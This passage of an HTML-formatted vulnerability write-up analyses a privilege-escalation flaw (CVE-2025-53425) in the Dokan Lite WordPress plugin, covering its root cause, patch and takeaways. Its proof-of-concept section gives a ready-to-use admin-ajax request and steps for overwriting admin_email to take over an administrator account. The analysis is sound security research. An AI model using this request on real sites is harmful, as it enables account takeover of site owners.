&lt;code&gt;get_core_capabilities()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_core_capabilities() {&#xA;    $capabilities = array();&#xA;&#xA;    $capabilities[&amp;#39;core&amp;#39;] = array(&#xA;        &amp;#39;manage_woocommerce&amp;#39;,&#xA;        &amp;#39;create_customers&amp;#39;,&#xA;        &amp;#39;view_woocommerce_reports&amp;#39;,&#xA;    );&#xA;&#xA;    $capability_types = array( &amp;#39;product&amp;#39;, &amp;#39;shop_order&amp;#39;, &amp;#39;shop_coupon&amp;#39; );&#xA;&#xA;    foreach ( $capability_types as $capability_type ) {&#xA;&#xA;        $capabilities[ $capability_type ] = array(&#xA;            // Post type.&#xA;            &amp;#34;edit_{$capability_type}&amp;#34;,&#xA;            &amp;#34;read_{$capability_type}&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}&amp;#34;,&#xA;            &amp;#34;edit_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_others_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;publish_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;read_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_published_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_others_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_published_{$capability_type}s&amp;#34;,&#xA;&#xA;            // Terms.&#xA;            &amp;#34;manage_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;edit_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;assign_{$capability_type}_terms&amp;#34;,&#xA;        );&#xA;    }&#xA;&#xA;    return $capabilities;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function defines &lt;strong&gt;core WooCommerce capabilities&lt;/strong&gt;, including:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;create_customers&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;view_woocommerce_reports&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;These capabilities are later assigned to user roles in &lt;code&gt;create_roles()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function create_roles() {&#xA;    ...&#xA;    // Shop manager role.&#xA;    add_role(&#xA;        &amp;#39;shop_manager&amp;#39;,&#xA;        &amp;#39;Shop manager&amp;#39;,&#xA;        array(&#xA;            &amp;#39;level_9&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_8&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_7&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_6&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_5&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_4&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_3&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_2&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_1&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_0&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;read&amp;#39;                   =&amp;gt; true,&#xA;            &amp;#39;read_private_pages&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;read_private_posts&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_posts&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_pages&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_published_posts&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;edit_published_pages&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;edit_private_pages&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_private_posts&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_others_posts&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;edit_others_pages&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;publish_posts&amp;#39;          =&amp;gt; true,&#xA;            &amp;#39;publish_pages&amp;#39;          =&amp;gt; true,&#xA;            &amp;#39;delete_posts&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;delete_pages&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;delete_private_pages&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;delete_private_posts&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;delete_published_pages&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;delete_published_posts&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;delete_others_posts&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;delete_others_pages&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;manage_categories&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;manage_links&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;moderate_comments&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;upload_files&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;export&amp;#39;                 =&amp;gt; true,&#xA;            &amp;#39;import&amp;#39;                 =&amp;gt; true,&#xA;            &amp;#39;list_users&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_theme_options&amp;#39;     =&amp;gt; true,&#xA;        )&#xA;    );&#xA;&#xA;    $capabilities = self::get_core_capabilities();&#xA;&#xA;    foreach ( $capabilities as $cap_group ) {&#xA;        foreach ( $cap_group as $cap ) {&#xA;            $wp_roles-&amp;gt;add_cap( &amp;#39;shop_manager&amp;#39;, $cap );&#xA;            $wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, $cap );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function creates and configures user roles. The &lt;strong&gt;&lt;code&gt;shop_manager&lt;/code&gt; role&lt;/strong&gt; is granted many high-level permissions, nearly equivalent to &lt;strong&gt;Administrator&lt;/strong&gt;, including:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Managing posts, pages, and comments&lt;/li&gt;&#xA;&lt;li&gt;Uploading files, import/export&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_theme_options&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;All WooCommerce core capabilities are then assigned to:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;shop_manager&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;administrator&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$wp_roles-&amp;gt;add_cap( &amp;#39;shop_manager&amp;#39;, $cap );&#xA;$wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, $cap );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means &lt;strong&gt;Shop Manager has the &lt;code&gt;manage_woocommerce&lt;/code&gt; capability&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Therefore, for &lt;code&gt;save_settings_value()&lt;/code&gt; to continue execution, the user must have the &lt;strong&gt;Shop Manager&lt;/strong&gt; role. Such a user can be created via the WordPress Admin Dashboard.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/create.png&#34; title=&#34;Create Shop Manager User&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/create.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Shop Manager User&lt;/h2&gt;&lt;p&gt;Create Shop Manager User&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/create.png&#39; alt=&#34;Create Shop Manager User&#34; height=&#34;555&#34; width=&#34;1195&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create Shop Manager User&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;As the function name suggests, &lt;code&gt;save_settings_value()&lt;/code&gt; is responsible for saving &lt;strong&gt;Dokan settings&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/setting.png&#34; title=&#34;Dokan Settings UI&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/setting.png&#34; data-sub-html=&#34;&lt;h2&gt;Setting&lt;/h2&gt;&lt;p&gt;Dokan Settings UI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/setting.png&#39; alt=&#34;Setting&#34; height=&#34;913&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Dokan Settings UI&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Using a &lt;strong&gt;debugger&lt;/strong&gt;, a &lt;strong&gt;breakpoint&lt;/strong&gt; is set at &lt;code&gt;save_settings_value()&lt;/code&gt; and the settings are saved from the admin UI.&lt;/p&gt;&#xA;&lt;p&gt;If the debugger works correctly, execution stops at the breakpoint, confirming:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The settings save request reaches &lt;code&gt;save_settings_value()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;The current user &lt;strong&gt;passes the &lt;code&gt;manage_woocommerce&lt;/code&gt; check&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;dokan_admin&lt;/code&gt; nonce is &lt;strong&gt;valid&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/debug.png&#34; title=&#34;Debugger Active&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/debug.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger Active&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/debug.png&#39; alt=&#34;Debug&#34; height=&#34;637&#34; width=&#34;1904&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger Active&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This confirms that the settings-saving functionality can be executed successfully and behaves exactly as analyzed.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;strong&gt;root cause of the vulnerability&lt;/strong&gt; lies here:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$option_name  = sanitize_text_field( wp_unslash( $_POST[&amp;#39;section&amp;#39;] ) );&#xA;$option_value = $this-&amp;gt;sanitize_options( wp_unslash( $_POST[&amp;#39;settingsData&amp;#39;] ), &amp;#39;edit&amp;#39; );&#xA;update_option( $option_name, $option_value );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This code allows &lt;strong&gt;request data to be written directly to &lt;code&gt;wp_options&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The user can &lt;strong&gt;fully control &lt;code&gt;$option_name&lt;/code&gt; via the &lt;code&gt;section&lt;/code&gt; parameter&lt;/strong&gt;. Although the data is sanitized, there is &lt;strong&gt;no whitelist restricting which options may be updated&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Combined with the fact that &lt;strong&gt;Shop Manager has &lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/strong&gt;, a &lt;strong&gt;non-Administrator role&lt;/strong&gt; can:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Write or overwrite &lt;strong&gt;any option&lt;/strong&gt; in the system&lt;/li&gt;&#xA;&lt;li&gt;Modify &lt;strong&gt;global WordPress/Dokan configuration&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;This results in &lt;strong&gt;Privilege Escalation&lt;/strong&gt;, as a lower-privileged user can perform actions intended only for &lt;strong&gt;Administrators&lt;/strong&gt; by manipulating sensitive database options.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;A common &lt;strong&gt;Privilege Escalation&lt;/strong&gt; scenario via &lt;code&gt;update_option()&lt;/code&gt; is:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Set &lt;code&gt;users_can_register = 1&lt;/code&gt; → enable user registration&lt;/li&gt;&#xA;&lt;li&gt;Set &lt;code&gt;default_role = administrator&lt;/code&gt; → new users become Administrators&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;However, when using &lt;strong&gt;WooCommerce with Dokan&lt;/strong&gt;, user registration does &lt;strong&gt;not&lt;/strong&gt; use WordPress’s default &lt;code&gt;/wp-login.php?action=register&lt;/code&gt; endpoint, but instead &lt;code&gt;/my-account/&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/register.png&#34; title=&#34;Register&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/register.png&#34; data-sub-html=&#34;&lt;h2&gt;Register&lt;/h2&gt;&lt;p&gt;Register&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/register.png&#39; alt=&#34;Register&#34; height=&#34;1081&#34; width=&#34;1638&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Register&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This flow only allows registration as &lt;strong&gt;Customer&lt;/strong&gt; or &lt;strong&gt;Vendor&lt;/strong&gt;, making the above scenario infeasible.&lt;/p&gt;&#xA;&lt;p&gt;Nevertheless, an attacker can exploit another vector by &lt;strong&gt;changing the &lt;code&gt;admin_email&lt;/code&gt; option&lt;/strong&gt;, allowing them to:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Set the admin email to an attacker-controlled address&lt;/li&gt;&#xA;&lt;li&gt;Use the &lt;strong&gt;Forgot Password&lt;/strong&gt; function&lt;/li&gt;&#xA;&lt;li&gt;Take over the &lt;strong&gt;Administrator account&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Example database check:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_options where option_name = &amp;#39;admin_email&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name | option_value    | autoload |&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;|         7 | admin_email | admin@gmail.com | on       |&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.001 sec)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This still results in &lt;strong&gt;Privilege Escalation&lt;/strong&gt;, not by creating a new admin, but by &lt;strong&gt;taking over an existing one&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;p&gt;The &lt;strong&gt;v4.1.3 patch&lt;/strong&gt; added &lt;strong&gt;validation and restriction of &lt;code&gt;option_name&lt;/code&gt;&lt;/strong&gt;, allowing updates only to options belonging to valid settings sections:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// validate and sanitize option name to avoid any unwanted option update&#xA;if ( ! in_array( $option_name, wp_list_pluck( $this-&amp;gt;get_settings_sections(), &amp;#39;id&amp;#39; ), true ) ) {&#xA;    throw new DokanException( &amp;#39;dokan_settings_invalid_section&amp;#39;, __( &amp;#39;Invalid section name.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 400 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As a result, users &lt;strong&gt;can no longer arbitrarily specify option names&lt;/strong&gt;, preventing overwriting sensitive options such as &lt;code&gt;admin_email&lt;/code&gt;, and &lt;strong&gt;mitigating the Privilege Escalation vulnerability&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Shop Manager (Authenticated User)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Click Save Settings (Dokan Admin UI)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;action=dokan_save_settings&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_ajax_dokan_save_settings&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Settings::save_settings_value()&amp;#34;]&#xA;&#xA;F --&amp;gt; G{&amp;#34;current_user_can(&amp;#39;manage_woocommerce&amp;#39;)?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;Abort&amp;#34;]&#xA;G -- Yes --&amp;gt; I{&amp;#34;Nonce dokan_admin valid?&amp;#34;}&#xA;&#xA;I -- No --&amp;gt; J[&amp;#34;Abort&amp;#34;]&#xA;I -- Yes --&amp;gt; K[&amp;#34;Read POST parameters&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;section taken as option_name&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;settingsData taken as option_value&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;update_option(option_name, option_value)&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Sensitive wp_options modified&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Change admin_email&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Use Forgot Password&amp;#34;]&#xA;Q --&amp;gt; R[&amp;#34;Take over Administrator account&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Visit &lt;code&gt;http://localhost/wp-admin/admin.php?page=dokan#/settings&lt;/code&gt; and click &lt;strong&gt;Save Changes&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Intercept the request with Burp Proxy&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Replay the request with modified parameters:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;section=admin_email&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;settingsData=attacker@gmail.com&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: shop_manager_cookie&#xA;&#xA;action=dokan_save_settings&amp;amp;nonce=d7311ec197&amp;amp;settingsData=attacker@gmail.com&amp;amp;section=admin_email&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/result.png&#39; alt=&#34;Result&#34; height=&#34;745&#34; width=&#34;1612&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;Dokan Lite ≤ 4.1.3&lt;/strong&gt; is caused by &lt;strong&gt;insufficient privilege enforcement&lt;/strong&gt;. Relying solely on &lt;code&gt;manage_woocommerce&lt;/code&gt; allows &lt;strong&gt;Shop Manager&lt;/strong&gt; users to invoke settings-saving functionality and overwrite &lt;strong&gt;arbitrary WordPress options&lt;/strong&gt; via &lt;code&gt;update_option()&lt;/code&gt;, resulting in &lt;strong&gt;Privilege Escalation&lt;/strong&gt; (e.g., administrator takeover via &lt;code&gt;admin_email&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;manage_woocommerce&lt;/code&gt; is &lt;strong&gt;too broad&lt;/strong&gt; for system-wide actions&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Shop Manager should not be allowed to modify global system options&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;update_option()&lt;/code&gt; must be protected with &lt;strong&gt;strict option whitelisting&lt;/strong&gt; or &lt;strong&gt;Administrator-only access&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener 